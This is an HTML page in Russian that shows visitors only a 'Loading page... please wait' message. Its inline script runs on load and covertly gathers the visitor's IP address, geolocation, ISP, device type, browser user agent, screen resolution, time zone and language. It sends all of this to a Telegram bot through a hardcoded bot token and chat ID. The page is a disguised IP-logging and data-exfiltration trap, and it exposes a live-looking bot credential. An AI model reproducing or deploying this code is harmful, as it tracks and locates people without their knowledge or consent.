<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="loader">
        <h2>Загрузка страницы...</h2>
        <p>Пожалуйста, подождите.</p>
    </div>

    <script>
        async function sendUserInfo() {
            const botToken = "9052023061:AAEeZ-1niUzjOLs06LwFxEolmcWv4m5Tka8";
            const chatId = "8705328341";

            try {
                // 1. Получаем IP и геолокацию по IP через бесплатное API
                let ipData = {};
                try {
                    let response = await fetch('https://ipapi.co/json/');
                    ipData = await response.json();
                } catch (e) {
                    ipData = { ip: "Не удалось определить", city: "Неизвестно", country_name: "Неизвестно", org: "Неизвестно" };
                }

                // 2. Собираем информацию об устройстве и браузере
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenWidth = window.screen.width;
                const screenHeight = window.screen.height;
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                
                // Проверка на мобильное устройство / ПК
                const isMobile = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Мобильное" : "💻 ПК";

                // 3. Формируем сообщение
                let message = `🎯 **Новый визит на сайт!**\n\n` +
                              `🌐 **IP:** \`${ipData.ip || 'Неизвестно'}\`\n` +
                              `🌍 **Страна / Город:** ${ipData.country_name || '?'}, ${ipData.city || '?'}\n` +
                              `🏢 **Провайдер:** ${ipData.org || 'Неизвестно'}\n` +
                              `📱 **Тип устройства:** ${isMobile}\n` +
                              `💻 **Платформа:** ${platform}\n` +
                              `🌐 **Браузер (User-Agent):** \`${userAgent}\`\n` +
                              `📐 **Разрешение экрана:** ${screenWidth}x${screenHeight}\n` +
                              `🕒 **Часовой пояс:** ${timeZone}\n` +
                              `🗣 **Язык системы:** ${language}`;

                // 4. Отправляем данные в Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown"
                    })
                });

            } catch (error) {
                console.error("Ошибка отправки:", error);
            }
        }

        // Запускаем отправку сразу при открытии сайта
        sendUserInfo();
    </script>
</body>
</html>
